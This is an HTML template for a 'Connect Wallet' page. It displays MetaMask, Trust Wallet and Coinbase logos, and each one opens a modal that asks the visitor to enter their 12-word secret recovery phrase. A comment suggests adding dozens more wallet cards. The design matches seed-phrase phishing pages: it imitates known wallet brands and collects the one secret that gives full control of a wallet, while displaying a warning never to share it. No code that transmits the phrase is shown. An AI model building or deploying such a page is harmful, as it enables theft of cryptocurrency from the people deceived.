<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Connect Wallet</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    :root {
      --primary: #3375BB;
      --secondary: #05C0A5;
      --dark: #0B0E11;
      --dark-gray: #151A21;
      --light-gray: #2A3139;
      --text-light: #FFFFFF;
      --text-gray: #8B939F;
      --positive: #05C0A5;
      --negative: #FF6250;
      --card-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
    }

    body {
      background-color: var(--dark);
      color: var(--text-light);
      font-family: 'Segoe UI', sans-serif;
    }

    .wallet-title {
      text-align: center;
      padding: 20px;
      font-size: 20px;
      font-weight: 600;
    }

    .wallet-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 15px;
      padding: 15px;
    }

    .wallet-card {
      background-color: var(--light-gray);
      border-radius: 12px;
      padding: 15px 10px;
      text-align: center;
      box-shadow: var(--card-shadow);
      cursor: pointer;
      transition: all 0.2s ease-in-out;
    }

    .wallet-card:hover {
      transform: translateY(-3px);
      background-color: var(--dark-gray);
    }

    .wallet-card img {
      width: 32px;
      height: 32px;
      margin-bottom: 10px;
    }

    .wallet-card span {
      display: block;
      font-size: 13px;
      color: var(--text-gray);
    }

    .modal-content {
      background-color: var(--dark-gray);
      border-radius: 12px;
      padding: 20px;
      color: var(--text-light);
    }

    .security-warning {
      background-color: #332f1c;
      color: var(--negative);
      padding: 12px;
      border-radius: 8px;
      font-size: 13px;
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
    }

    .phrase-input {
      background-color: var(--light-gray);
      border: 1px solid #444;
      border-radius: 8px;
      width: 100%;
      color: var(--text-light);
      padding: 10px;
      min-height: 100px;
      resize: none;
    }

    .word-counter {
      font-size: 12px;
      color: var(--text-gray);
      margin-top: 5px;
      text-align: right;
    }

    .phrase-hint {
      display: flex;
      align-items: center;
      font-size: 13px;
      color: var(--text-gray);
      margin-top: 10px;
      gap: 5px;
    }

    .btn-primary {
      background-color: var(--primary);
      border: none;
      width: 100%;
    }

    .btn-primary:hover {
      background-color: #2d6aad;
    }
  </style>
</head>
<body>

  <div class="wallet-title">Connect Your Wallet</div>
  <div class="wallet-grid">

    <!-- Example Wallet -->
    <div class="wallet-card" data-bs-toggle="modal" data-bs-target="#connectModal">
      <img src="https://cryptologos.cc/logos/metamask-fox-logo.png" alt="MetaMask">
      <span>MetaMask</span>
    </div>

    <div class="wallet-card" data-bs-toggle="modal" data-bs-target="#connectModal">
      <img src="https://cryptologos.cc/logos/trust-wallet-logo.png" alt="Trust Wallet">
      <span>Trust Wallet</span>
    </div>

    <div class="wallet-card" data-bs-toggle="modal" data-bs-target="#connectModal">
      <img src="https://cryptologos.cc/logos/coinbase-coin-logo.png" alt="Coinbase">
      <span>Coinbase</span>
    </div>

    <!-- Add more wallet cards as needed (20–50 total) -->
  </div>

  <!-- Modal -->
  <div class="modal fade" id="connectModal" tabindex="-1" aria-labelledby="connectModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <div class="modal-content">
        <form id="phraseLoginForm">
          <div class="modal-header border-0">
            <h5 class="modal-title" id="connectModalLabel">Manual Wallet Connect</h5>
            <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">

            <div class="security-warning">
              ⚠️ Never share your secret phrase with anyone. It gives full access to your wallet.
            </div>

            <label class="input-label">Enter your 12-word secret phrase</label>
            <textarea class="phrase-input" id="secretPhrase" placeholder="Enter your 12-word phrase" required></textarea>
            <div class="word-counter" id="wordCounter">0/12 words</div>

            <div class="phrase-hint">
              <svg width="16" height="16" viewBox="0 0 24 24" stroke="currentColor" fill="none" stroke-width="2">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="16" x2="12" y2="12"></line>
                <line x1="12" y1="8" x2="12" y2="8"></line>
              </svg>
              Typically 12 (sometimes 24) words separated by spaces
            </div>

            <button type="submit" class="btn btn-primary mt-3">Connect Phrase Manually</button>
          </div>
        </form>
      </div>
    </div>
  </div>

  <script>
    const secretPhrase = document.getElementById("secretPhrase");
    const wordCounter = document.getElementById("wordCounter");

    secretPhrase.addEventListener("input", () => {
      const words = secretPhrase.value.trim().split(/\s+/).filter(Boolean);
      wordCounter.textContent = `${words.length}/12 words`;
    });
  </script>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
